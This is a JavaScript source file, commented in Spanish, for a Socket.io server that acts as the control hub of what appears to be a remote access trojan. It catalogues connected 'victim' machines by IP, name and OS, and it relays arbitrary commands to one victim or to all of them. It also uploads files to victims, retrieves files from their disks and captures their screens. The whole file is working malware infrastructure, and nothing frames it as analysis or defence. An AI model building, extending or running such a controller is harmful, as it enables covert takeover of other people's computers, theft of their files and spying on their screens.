const salidaConsola = new (require('./funciones'))




class Socket {
    static instance = null; // Instancia única de la clase Socket
    lista_Clientes = {}; // Lista de clientes conectados

    constructor(io) {
        if (!Socket.instance) {
            this.io = io;
            this.registerEventHandlers();
            Socket.instance = this;
        }
        return Socket.instance;
    }

    /**
     * Registra los manejadores de eventos.
     */
    registerEventHandlers() {
        this.io.on('connection', (socket) => {
            this.initializeClientData(socket);

            // Solicitar información adicional al cliente
            socket.emit('solicitarInfoCliente');

            
            // Manejar la recepción de información adicional del cliente
            socket.on('obtenerInformacionCliente', (datos) => {
                salidaConsola.enviado('obtenerInformacionCliente ',datos)
                this.updateClientData(socket.id, datos);
                this.io.emit('listaClientes', this.lista_Clientes);
            });




            this.io.emit('listaClientes', this.lista_Clientes);












            

            // Manejar la ejecución de comandos
            socket.on('ejecutarComando', (datos) => {
                salidaConsola.enviado('comando enviado ',datos)
                this.emitCommandToClient(datos);
            });

            // Manejar las respuestas de los comandos ejecutados por el cliente
            socket.on('respuestaComando', (datos) => {
                salidaConsola.recuperado('respuesta recibido  ',datos)
                this.io.emit('respuestaComando', datos);
            });













            // Manejar la creación de archivos
            socket.on('crearArchivo', (datos) => {
                salidaConsola.enviado('crear archivo: ',datos)
                this.io.to(datos.idVictima).emit('crearArchivo', datos);
            });

            // Manejar las respuestas de la creación de archivos
            socket.on('respuestaCrearArchivo', (datos) => {
                salidaConsola.recuperado('respuesta archivo creado ',datos)
                this.io.emit('respuestaCrearArchivo', datos);
            });



            // Manejar el envío de archivos
            socket.on('enviarArchivo', (datos) => {
                salidaConsola.enviado('archivo enviado ',)
                this.io.to(datos.idVictima).emit('recibirArchivoServidor', datos.archivo);
            });

            // Manejar las respuestas del envío de archivos
            socket.on('respuestaArchivoEnviado', (datos) => {
                salidaConsola.recuperado('respuesta archivo enviado ',datos)
                this.io.emit('respuestaArchivoEnviado', datos);
            });



            // Manejar la recuperación de archivos
            socket.on('recuperarArchivo', (datos) => {
                salidaConsola.enviado('recuperar archivo: ',datos)
                this.io.to(datos.idVictima).emit('recuperarArchivo', datos.ruta);
            });

            // Manejar las respuestas de la recuperación de archivos
            socket.on('recibirArchivoCliente', (datos) => {
                salidaConsola.recuperado('archivo recuperado ')
                this.io.emit('recibirArchivoCliente', datos);
            });

            // Manejar los errores de lectura de archivos
            socket.on('errorLecturaArchivo', (datos) => {
                salidaConsola.error('error recuperar archivo: ',datos)
                this.io.emit('errorLecturaArchivo', datos);
            });

            // Manejar la captura de pantalla
            socket.on('capturar_pantalla', (datos) => {
                salidaConsola.enviado('capturar pantalla ',datos)
                this.io.to(datos.idVictima).emit('capturar_pantalla', datos);
            });

            // Manejar la recuperación de la captura de pantalla
            socket.on('recuperarCaptura', (datos) => {
                salidaConsola.recuperado('captura de pantalla recuperado ')
                this.io.emit('recuperarCaptura', datos);
            });

            // Manejar los errores de la captura de pantalla
            socket.on('errorCapturaPantalla', (datos) => {
                salidaConsola.error('error al captura pantalla ',datos)
                this.io.emit('errorCapturaPantalla', datos);
            });

            // Manejar la desconexión del cliente
            socket.on('disconnect', () => {
                delete this.lista_Clientes[socket.id];
            });
        });
    }

    initializeClientData(socket) {
        this.lista_Clientes[socket.id] = {
            'ipLocal': null,
            'ipPublica': null,
            'nombre': null,
            'sistema_operativo': null,
            'arquitectura': null,
        };
    }

    updateClientData(socketId, datos) {
        this.lista_Clientes[socketId] = {
            'ipLocal': datos.ipLocal,
            'ipPublica': datos.ipPublica,
            'nombre': datos.nombre,
            'sistema_operativo': datos.sistema_operativo,
            'arquitectura': datos.arquitectura,
        };
    }

    emitCommandToClient(datos) {
        const instruccion = datos.comando;
        const victima = datos.idVictima;

        if (victima === 'TODOS') {
            this.io.emit('recibirInstruccion', { instruccion });
        } else {
            this.io.to(victima).emit('recibirInstruccion', { instruccion });
        }
    }

    getCliente() {
        return this.lista_Clientes;
    }

    static getInstance() {
        return Socket.instance;
    }



}

module.exports = Socket;
